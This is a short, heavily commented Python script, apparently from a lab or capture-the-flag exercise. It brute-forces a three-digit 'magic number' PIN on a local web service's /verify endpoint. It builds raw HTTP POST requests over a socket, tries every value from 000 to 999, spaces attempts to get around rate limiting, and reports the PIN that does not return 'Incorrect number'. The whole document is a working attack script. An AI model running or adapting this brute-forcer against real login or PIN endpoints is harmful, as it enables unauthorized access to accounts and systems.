import socket  # Importing socket module for creating network connections
import time    # Importing time module to introduce delays between requests

# Define the server address and port to connect to
HOST = '127.0.0.1'  # Localhost address (the server is running locally)
PORT = 8888          # Port number where the server is listening

# Function to send the POST request using a raw socket connection
def send_request(pin):
    # Build the raw HTTP POST request as a string
    request = f"POST /verify HTTP/1.1\r\n"
    request += f"Host: {HOST}:{PORT}\r\n"  # Specify the target host and port in the header
    request += f"Connection: close\r\n"  # Close the connection after the request
    request += f"Content-Length: {len('magicNumber=' + pin)}\r\n"  # Set content length (length of the data we're sending)
    request += f"Content-Type: application/x-www-form-urlencoded\r\n"  # Indicate form data encoding
    request += f"\r\n"  # Blank line after headers to separate headers and body
    request += f"magicNumber={pin}\r\n"  # Add the magic number (PIN) to the body of the request

    # Create a socket object and establish a connection to the target server
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))  # Connect to the server at the specified HOST and PORT
        s.sendall(request.encode())  # Send the request to the server
        response = s.recv(4096).decode()  # Receive the server's response (up to 4096 bytes)
        return response  # Return the server response for further processing

# Function to brute-force all possible PIN combinations from 000 to 999
def brute_force():
    for i in range(1000):  # Loop through numbers from 0 to 999
        pin = f"{i:03}"  # Format the number with leading zeros (e.g., 000, 001, ..., 999)
        print(f"Trying {pin}...", end=' ')  # Print the current attempt

        # Send the request with the current PIN and get the server's response
        response = send_request(pin)

        # Check if the response contains the text "Incorrect number"
        if "Incorrect number" not in response:
            # If the response does not contain "Incorrect number", print success
            print(f"✅ Success! Magic number found: {pin}")
            break  # Exit the loop because we've found the correct PIN
        else:
            # If the response contains "Incorrect number", print failure
            print("❌ Incorrect.")

        # Add a 1-second delay between each attempt to handle server rate limits
        time.sleep(1)

# Start the brute-forcing process
brute_force()
